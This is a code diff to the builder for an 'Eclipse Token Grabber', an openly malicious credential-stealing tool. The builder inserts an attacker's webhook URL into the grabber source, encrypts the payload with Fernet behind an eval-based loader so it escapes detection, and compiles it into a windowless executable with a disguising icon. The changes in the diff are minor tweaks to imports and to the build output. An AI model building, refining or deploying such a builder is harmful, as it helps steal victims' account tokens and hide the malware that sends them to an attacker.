@@ -19,14 +19,15 @@ ECLIPSE_GRABBER_PATH = path.join("code", "eclipse-grabber.py")
 
 KEY = Fernet.generate_key().decode()
 
+
 def build(webhook: str, out_file: str):
     code_file = open(ECLIPSE_GRABBER_PATH, 'r')
     code = code_file.read()
     code_file.close()
-    index = code.find("WEBHOOK")
-    libs = code[0:index] + "from cryptography.fernet import Fernet\n"
-    content = code[index:-1].replace("{WEBHOOK}", str(webhook))
 
+    index = code.find("WEBHOOK")
+    libs = code[0:index] + "\nfrom cryptography.fernet import Fernet\n"
+    content = code[index:-1].replace("{WEBHOOK}", str(webhook))
 
     encrypted_content = Fernet(KEY).encrypt(content.encode())
     eval_code = f"\ncode = Fernet('{KEY}').decrypt({encrypted_content}).decode();eval(compile(code, '<string>', 'exec'))"
@@ -49,7 +50,7 @@ def build(webhook: str, out_file: str):
     compile_command += [out_file + ".py", "--onefile", "--noconsole", f"--icon={path.join('img','exe_file.ico')}"]
 
     try:
-        command_result = run(compile_command, stdout=PIPE, stderr=PIPE)
+        command_result = run(args=compile_command, stdout=PIPE, stderr=PIPE)
         result = str(command_result.stderr).replace("b\"", "").replace(r'\n', '\n').replace(r'\r', '\r')
         if "completed successfully" not in result:
             raise Exception(result)  # result.splitlines()[-2]
@@ -72,9 +73,10 @@ def get_args() -> Namespace:
 
 def main(args: Namespace):
     print(TITLE)
+    print("[+] Encryption Key:", KEY)
     print("\n[+] Building Eclipse Token Grabber, please wait...")
     build(args.webhook, args.outfile)
-    print("\n\n[+] Successfully Built!",
+    print("\n[+] Successfully Built!",
           "\n\n[+] You can find it inside the dist directory")
 
 
